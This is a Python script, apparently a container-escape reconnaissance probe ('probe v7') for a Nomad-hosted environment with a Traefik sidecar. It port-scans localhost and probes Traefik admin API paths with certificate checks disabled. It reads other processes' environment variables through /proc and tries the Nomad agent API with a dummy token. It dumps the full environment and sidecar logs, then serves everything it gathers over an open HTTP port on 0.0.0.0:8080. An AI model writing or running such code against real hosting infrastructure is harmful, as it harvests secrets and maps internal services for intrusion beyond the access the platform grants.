import http.server
import urllib.request
import json
import os
import socket
import ssl
import subprocess

results = {}

def probe(name, url, timeout=3, headers=None):
    try:
        req = urllib.request.Request(url)
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        data = resp.read().decode('utf-8', errors='replace')
        results[name] = {"status": resp.status, "data": data[:8000], "headers": dict(resp.headers)}
    except Exception as e:
        results[name] = {"error": str(e)}

def port_scan(name, host, ports, timeout=1):
    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((host, port))
            if result == 0:
                open_ports.append(port)
            s.close()
        except:
            pass
    results[name] = {"open_ports": open_ports}

def run_cmd(name, cmd, timeout=8):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=isinstance(cmd, str))
        results[name] = {"stdout": r.stdout[:8000], "stderr": r.stderr[:500]}
    except Exception as e:
        results[name] = {"error": str(e)}

# 1. FULL localhost port scan (find Traefik ports)
# Scan wide range to find Traefik admin API
all_ports = list(range(8000, 8100)) + list(range(9000, 9100)) + list(range(27000, 28000)) + [80, 443, 3000, 4180, 15000, 15001, 2375, 4646, 5000, 6060, 6443]
port_scan("localhost_wide", "127.0.0.1", all_ports)

# 2. Try known Traefik admin API ports
for port in [8080, 8081, 8082, 8443, 9000, 9080, 9090, 27305]:
    probe(f"traefik_api_{port}", f"http://127.0.0.1:{port}/api/overview")
    probe(f"traefik_dash_{port}", f"http://127.0.0.1:{port}/dashboard/")
    probe(f"traefik_raw_{port}", f"http://127.0.0.1:{port}/api/rawdata")
    probe(f"traefik_version_{port}", f"http://127.0.0.1:{port}/api/version")

# 3. Try HTTPS versions for Traefik
for port in [8443, 443, 27305]:
    probe(f"traefik_https_{port}", f"https://127.0.0.1:{port}/api/overview")
    probe(f"traefik_https_dash_{port}", f"https://127.0.0.1:{port}/dashboard/")

# 4. Try the listening port 27305 with various paths
probe("port27305_root", "http://127.0.0.1:27305/")
probe("port27305_api", "http://127.0.0.1:27305/api/")
probe("port27305_api_overview", "http://127.0.0.1:27305/api/overview")
probe("port27305_api_rawdata", "http://127.0.0.1:27305/api/rawdata")
probe("port27305_api_http_routers", "http://127.0.0.1:27305/api/http/routers")
probe("port27305_api_http_middlewares", "http://127.0.0.1:27305/api/http/middlewares")

# 5. HTTPS on 27305
probe("port27305_https_root", "https://127.0.0.1:27305/")
probe("port27305_https_api", "https://127.0.0.1:27305/api/overview")

# 6. Search for Traefik config file in shared filesystem
run_cmd("find_traefik", "find / -maxdepth 5 -name 'traefik*' -o -name '*.toml' -o -name 'dynamic*' 2>/dev/null | grep -v proc | head -20")

# 7. Try /proc of sidecar (if PID namespace is shared)
run_cmd("sidecar_procs", """
for pid in $(ls /proc/ | grep -E '^[0-9]+$'); do
    cmd=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\\0' ' ')
    if echo "$cmd" | grep -qi 'traefik'; then
        echo "PID $pid: $cmd"
        echo "ENV:"
        cat /proc/$pid/environ 2>/dev/null | tr '\\0' '\\n' | head -30
        echo "---"
    fi
done
""")

# 8. Read Nomad API response body when 403
run_cmd("nomad_403_body", """
curl -sk https://169.254.1.2:4646/v1/agent/self 2>&1
echo "---STATUS---"
curl -sk -o /dev/null -w '%{http_code}' https://169.254.1.2:4646/v1/agent/self 2>&1
""")

# 9. Try Nomad with dummy tokens
run_cmd("nomad_anon", "curl -sk -H 'X-Nomad-Token: anonymous' https://169.254.1.2:4646/v1/agent/self 2>&1 | head -c 500")

# 10. Env and all_env
results["all_env"] = dict(os.environ)

# 11. Read Traefik sidecar log for configuration hints
run_cmd("sidecar_log_full", "cat /alloc/logs/sidecar.stdout.0 2>/dev/null | head -100")

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(results, indent=2, default=str).encode())
    def log_message(self, *args):
        pass

print("Starting probe v7 on port 8080...")
http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
